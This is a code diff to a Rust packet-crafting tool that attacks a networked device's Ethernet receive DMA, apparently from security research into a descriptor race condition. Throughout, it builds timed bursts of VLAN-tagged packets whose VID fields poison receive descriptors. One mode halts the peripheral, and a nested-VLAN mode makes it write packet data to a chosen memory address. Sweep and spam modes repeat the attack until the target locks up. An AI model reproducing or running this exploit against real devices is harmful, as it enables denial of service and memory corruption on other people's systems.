@@ -1,5 +1,5 @@
 use anyhow::{anyhow, bail, Context, Result};
-use clap::{Parser, Subcommand};
+use clap::{Parser, Subcommand, ValueEnum};
 use log::{info, trace, warn};
 use pnet::{
     datalink::{DataLinkReceiver, DataLinkSender},
@@ -11,7 +11,7 @@ use pnet::{
         ip::{IpNextHeaderProtocol, IpNextHeaderProtocols},
         ipv6::{Ipv6Packet, MutableIpv6Packet},
         udp::{MutableUdpPacket, UdpPacket},
-        vlan::MutableVlanPacket,
+        vlan::{ClassOfService, MutableVlanPacket, VlanPacket},
         Packet,
     },
     util::MacAddr,
@@ -39,13 +39,30 @@ struct Args {
     #[arg(long)]
     mac: String,
 
+    /// Attack type
+    #[arg(long, value_enum, default_value_t=AttackType::InvalidAddress)]
+    attack: AttackType,
+
     #[clap(subcommand)]
     cmd: Command,
 }
 
+#[derive(Copy, Clone, Debug, ValueEnum)]
+enum AttackType {
+    /// Poison the descriptor with an invalid address
+    ///
+    /// This causes the Rx peripheral to stop entirely, which is easy to detect
+    InvalidAddress,
+
+    /// Poison the descriptor with a valid address
+    ///
+    /// This allows us to write the packet to an unexpected location
+    WrongAddress,
+}
+
 #[derive(Debug, Subcommand)]
 enum Command {
-    /// Sweeps packet delay across a range
+    /// Sweeps a particular attack across a range of values
     Sweep {
         /// Time offset at which to begin the sweep, in microseconds
         #[arg(long, allow_hyphen_values(true), default_value_t = -2000)]
@@ -54,13 +71,13 @@ enum Command {
         #[arg(long, allow_hyphen_values(true), default_value_t = 2000)]
         end: i64,
     },
-    /// Send a single packet with a specific delay
+    /// Send a single VID-poisoning packet with a specific delay
     One {
         /// Time offset, in microseconds
         #[arg(long, allow_hyphen_values(true))]
         delay: i64,
     },
-    /// Send a constant stream of packets with a specific delay
+    /// Send a constant stream of VID-poisoning packets with a specific delay
     Spam {
         /// Time offset, in microseconds
         #[arg(long, allow_hyphen_values(true))]
@@ -134,14 +151,38 @@ fn main() -> Result<()> {
             if end <= start {
                 bail!("end must be greater than start");
             }
-            let (delay, i) = worker.run_delay_sweep(start, end)?;
-            println!("locked up system with {delay} after {i} iterations");
+
+            let mut n = 0;
+            'outer: loop {
+                for delay in start..end {
+                    n += 1;
+                    if n % 1000 == 0 {
+                        info!("sent {n} attacks");
+                    }
+                    if let Err(e) = worker.run_one(delay, args.attack) {
+                        warn!("ignoring error {e}");
+                        continue;
+                    }
+                    // Add a brief delay, so that we're sure this packet doesn't
+                    // interfere with the attack sequence.
+                    if matches!(args.attack, AttackType::InvalidAddress) {
+                        std::thread::sleep(Duration::from_millis(10));
+                        if !worker.check_alive() {
+                            info!("killed with delay {delay}");
+                            println!(
+                                "locked up system with {delay} after {n} attacks"
+                            );
+                            break 'outer;
+                        }
+                    }
+                }
+            }
         }
         Command::One { delay } => {
-            worker.run_one(delay)?;
+            worker.run_one(delay, args.attack)?;
         }
         Command::Spam { delay } => loop {
-            worker.run_one(delay)?;
+            worker.run_one(delay, args.attack)?;
         },
     }
 
@@ -155,17 +196,17 @@ struct Worker {
 }
 
 impl Worker {
-    fn udp_packet(&self, data: &[u8]) -> impl Packet {
+    fn udp_packet(&self, data: &[u8]) -> EthernetPacket<'static> {
         let (udp, payload_len, tag) = self.builder.udp(data);
         let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);
         self.builder.eth(ipv6, ethertype)
     }
 
-    fn hello_packet(&self) -> impl Packet {
+    fn hello_packet(&self) -> EthernetPacket<'static> {
         self.udp_packet(&[0])
     }
 
-    fn delay_packet(&self) -> impl Packet {
+    fn delay_packet(&self) -> EthernetPacket<'static> {
         self.udp_packet(&[b'1'])
     }
 
@@ -177,49 +218,84 @@ impl Worker {
         self.receive_udp(Duration::from_millis(100)).is_some()
     }
 
-    fn run_delay_sweep(
-        &mut self,
-        start: i64,
-        end: i64,
-    ) -> Result<(i64, usize)> {
-        for n in 0.. {
-            info!("beginning iteration {n}");
-            for i in start..end {
-                if let Err(e) = self.run_one(i) {
-                    warn!("ignoring error {e}");
-                    break;
-                }
-                // Add a brief delay, so that we're sure this packet doesn't
-                // interfere with the attack sequence.
-                std::thread::sleep(Duration::from_millis(10));
-                if !self.check_alive() {
-                    info!("killed with delay {i}");
-                    return Ok((i, n));
-                }
-            }
-        }
-        unreachable!()
+    fn u16_to_vlan(
+        &self,
+        data: impl Packet,
+        ethertype: EtherType,
+        addr: u16,
+    ) -> (VlanPacket, EtherType) {
+        let priority = (addr >> 13) as u8;
+        let dei = ((addr >> 12) & 1) as u8;
+        let vid = addr & 0xFFF;
+
+        let mut vlan = MutableVlanPacket::owned(vec![
+            0u8;
+            MutableVlanPacket::minimum_packet_size()
+                + data.packet().len()
+        ])
+        .unwrap();
+
+        vlan.set_ethertype(ethertype);
+        vlan.set_vlan_identifier(vid);
+        vlan.set_priority_code_point(ClassOfService::new(priority));
+        vlan.set_drop_eligible_indicator(dei);
+        vlan.set_payload(data.packet());
+        (vlan.consume_to_immutable(), EtherTypes::Vlan)
     }
 
-    /// Tries to kill the target with a particular timing delay
-    fn run_one(&mut self, delay_micros: i64) -> Result<()> {
-        // Build our attack packets with a VLAN VID payload, triggering an invalid
-        // DMA write address if we successfully attack the descriptor.
-        let mut padding_packets = vec![];
+    fn addr_to_vlan(
+        &self,
+        data: impl Packet,
+        ethertype: EtherType,
+        addr: u32,
+    ) -> (VlanPacket, EtherType) {
+        let (vlan, ethertype) =
+            self.u16_to_vlan(data, ethertype, (addr >> 16) as u16);
+        self.u16_to_vlan(vlan, ethertype, addr as u16)
+    }
+
+    /// Sends a single attack with a particular timing delay
+    fn run_one(&mut self, delay_micros: i64, attack: AttackType) -> Result<()> {
+        // Build our attack packets with a either a single VLAN header
+        // (triggering a bad DMA write) or nested VLAN headers (poisoning the
+        // descriptor to write to an arbitrary address).
+        let mut poison_packets = vec![];
         for i in 0..4 {
             // Build a padded packet which is long enough to be discarded by the
             // target, to keep things simple.  The size matters, because it
             // determines how long user code takes to process the packet.
             let mut data: Vec<u8> = format!("data-{i}-").as_bytes().to_vec();
             for i in 0..16 {
-                data.push(b'1' + i % 10);
+                data.push(b'0' + i % 10);
             }
+
+            // Build the rest of the poison packet
             let (udp, payload_len, tag) = self.builder.udp(&data);
             let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);
-            let (vlan, ethertype) =
-                self.builder.vlan(0x301 + i, ipv6, ethertype);
-            let eth = self.builder.eth(vlan, ethertype);
-            padding_packets.push(eth);
+
+            let eth = match attack {
+                AttackType::InvalidAddress => {
+                    // This will poison the descriptor to an invalid address of
+                    // 0x301, which will cause Rx to stop.
+                    let (vlan, ethertype) =
+                        self.builder.vlan(0x301 + i, ipv6, ethertype);
+                    self.builder.eth(vlan, ethertype)
+                }
+                AttackType::WrongAddress => {
+                    // Build a nested VLAN packet that decodes to the given
+                    // address This should poison the descriptor with a valid
+                    // address, so the DMA peripheral will copy to that address
+                    // instead of failing
+                    let (vlan, ethertype) = self.addr_to_vlan(
+                        ipv6,
+                        ethertype,
+                        0x30010000 + i as u32 * 0x100,
+                    );
+                    self.builder.eth(vlan, ethertype)
+                }
+            };
+
+            poison_packets.push(eth);
         }
 
         // The contents of the attack packet don't matter, but its size does,
@@ -230,14 +306,14 @@ impl Worker {
         for i in 0..4 {
             let mut data: Vec<u8> = format!("attack-{i}-").as_bytes().to_vec();
             for i in 0..16 {
-                data.push(b'1' + i % 10);
+                data.push(b'0' + i % 10);
             }
             attack_packets.push(self.udp_packet(&data));
         }
 
         trace!("sending attack sequence with delay {delay_micros}");
 
-        // This triggers a 250 ms busywait
+        // This triggers a 20 ms busywait
         let send_start = Instant::now();
         self.sender.send_to(self.delay_packet().packet(), None);
         let send_end = Instant::now();
@@ -252,9 +328,9 @@ impl Worker {
         // Brief pause to make sure that the busy-wait happened
         std::thread::sleep(Duration::from_millis(10));
 
-        // Send four padding packets to put the ring in a known state while the
-        // busy-wait happens.
-        for p in &padding_packets {
+        // Send four poison packets to put the ring in a known state (with
+        // values in the RDES0 position) while the busy-wait happens.
+        for p in poison_packets {
             self.sender.send_to(p.packet(), None);
         }
 
@@ -340,12 +416,18 @@ impl Worker {
         // the odds of hitting any of the poisoned descriptors.  Oddly, sending
         // only one packet doesn't work at all; perhaps there's a buffer or
         // queue somewhere in the system which doesn't flush?
+        //
+        // (or possibly writing the tail pointer, i.e. sending a Receive Poll
+        // Demand, causes the DMA peripheral to re-read the descriptor?)
 
         for a in attack_packets {
-            // If we successfully poisoned the descriptor, then the DMA
-            // peripheral is waiting to write to an invalid address (which is
-            // the VID, so 0x302-4).  Any further communication will fail.
             self.sender.send_to(a.packet(), None);
+            // If we successfully poisoned the descriptor, then the DMA
+            // peripheral is waiting to write to an incorrect address!
+            //
+            // It may write one of the packets in this attack burst to that
+            // address, or a later packet (e.g. ambient network traffic or our
+            // check-alive ping).
         }
 
         // Receive the initial reply, from the delay packet initially.
@@ -408,7 +490,10 @@ struct Builder {
 }
 
 impl Builder {
-    fn udp(&self, data: &[u8]) -> (impl Packet, u16, IpNextHeaderProtocol) {
+    fn udp(
+        &self,
+        data: &[u8],
+    ) -> (UdpPacket<'static>, u16, IpNextHeaderProtocol) {
         let payload_len: u16 =
             (data.len() + 8).try_into().expect("packet size overflow");
 
@@ -425,7 +510,11 @@ impl Builder {
             &self.dest_ip,
         );
         udp.set_checksum(udp_chk);
-        (udp, payload_len, IpNextHeaderProtocols::Udp)
+        (
+            udp.consume_to_immutable(),
+            payload_len,
+            IpNextHeaderProtocols::Udp,
+        )
     }
 
     fn ipv6<P: Packet>(
@@ -433,7 +522,7 @@ impl Builder {
         data: P,
         payload_len: u16,
         next_header: IpNextHeaderProtocol,
-    ) -> (impl Packet, EtherType) {
+    ) -> (Ipv6Packet<'static>, EtherType) {
         let mut ipv6 = MutableIpv6Packet::owned(vec![
             0u8;
             Ipv6Packet::minimum_packet_size()
@@ -449,7 +538,7 @@ impl Builder {
         ipv6.set_payload_length(payload_len);
         ipv6.set_payload(data.packet());
 
-        (ipv6, EtherTypes::Ipv6)
+        (ipv6.consume_to_immutable(), EtherTypes::Ipv6)
     }
 
     fn vlan<P: Packet>(
@@ -457,7 +546,7 @@ impl Builder {
         vid: u16,
         data: P,
         tag: EtherType,
-    ) -> (impl Packet, EtherType) {
+    ) -> (VlanPacket<'static>, EtherType) {
         let mut vlan = MutableVlanPacket::owned(vec![
             0u8;
             MutableVlanPacket::minimum_packet_size()
@@ -468,10 +557,14 @@ impl Builder {
         vlan.set_ethertype(tag);
         vlan.set_vlan_identifier(vid);
         vlan.set_payload(data.packet());
-        (vlan, EtherTypes::Vlan)
+        (vlan.consume_to_immutable(), EtherTypes::Vlan)
     }
 
-    fn eth<P: Packet>(&self, data: P, tag: EtherType) -> impl Packet {
+    fn eth<P: Packet>(
+        &self,
+        data: P,
+        tag: EtherType,
+    ) -> EthernetPacket<'static> {
         let mut eth =
             MutableEthernetPacket::owned(vec![
                 0u8;
@@ -483,6 +576,6 @@ impl Builder {
         eth.set_source(self.source_mac);
         eth.set_ethertype(tag);
         eth.set_payload(data.packet());
-        eth
+        eth.consume_to_immutable()
     }
 }
